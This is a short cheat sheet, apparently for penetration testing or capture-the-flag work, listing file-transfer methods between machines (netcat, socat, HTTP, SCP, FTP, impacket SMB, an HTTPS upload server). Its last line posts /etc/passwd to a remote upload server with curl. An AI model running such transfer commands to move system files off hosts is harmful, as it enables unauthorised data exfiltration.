# Base64

**Sender:** `cat file | base64 -w 0;echo` <br>
**Reciever** `echo -n base64payload | base64 -d > filename`   Confirm md5 hash match in linux: `md5sum file`

# Netcat
**Sender:** `nc 10.10.10.10 4444 < file`<br>
**Reciever:** `nc -lvp 4444 > file`

# Web 

**Sender:** `python3 -m http.server 8080` <br>
**Reciever:** `wget http://10.10.10.10:8080/file` or `curl`

# SSH
**Sender:** `scp file username@hostname:/home/user/`<br>
**Reciever:** `scp username@hostname:/root/file .`<br>

# Socat

**Sender:** `socat TCP:192.168.0.107:4545 /home/kali/transfer.file`<br>
**Reciever:** `socat TCP-LISTEN:4545 /home/hunter/transfer.file`

# FTP
**Sender:** `python3 -m pyftpdlib -p21 -w` or `python3 -m pyftpdlib -u admin -P 8618` with user and password<br>
**Receiever** `ftp IP port` and put, get commands

# SMB
Without password from `/usr/share/doc/python3-impacket/examples`<br>
**Sender:** `python3 smbserver.py sharename /home/hunter`<br>
**Receiever:** `smbclient //IP/Sharename`<br>
With password:<br>
**Sender:** `python3 smbserver.py -username admin -password 8618 adminshare /home/hunter`<br>
**Reciever:** `smbclient -U admin //192.168.0.107/adminshare` <br>

# Upload server

1) Create openssl certificate:
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
2) Start upload server:
```bash
sudo python3 -m uploadserver 443 --server-certificate /location/server.pem
```
**Reciever:** `curl -X POST https://192.168.0.107/upload -F 'files=@/etc/passwd' --insecure` or browse web server to `/upload` location
